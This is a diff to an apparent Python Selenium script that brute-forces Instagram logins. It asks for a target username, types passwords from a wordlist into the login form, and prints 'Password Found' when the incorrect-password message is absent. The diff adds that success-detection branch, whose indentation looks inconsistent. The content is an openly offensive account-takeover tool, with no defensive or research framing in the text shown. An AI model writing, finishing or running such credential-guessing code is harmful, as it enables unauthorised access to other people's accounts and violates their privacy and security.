@@ -15,7 +15,6 @@ time.sleep(1)
 print("Please enter account's username")
 username = input()
 
-
 def startBruteforce(driver):
     try:
         driver.get(f"https://www.instagram.com/accounts/login/")
@@ -70,6 +69,10 @@ def startBruteforce(driver):
                      passwordField.send_keys(line)
                      print(f"Trying Password {line}")
                      time.sleep(3)
+                     if "Sorry, your password was incorrect" in loginpage_source:
+                         print("Invalid Password")
+                    else:
+                        print(f"Password Found {line} ") 
             except BaseException:
                 print("User Interrupted or any other random error")
             submitButton = WebDriverWait(
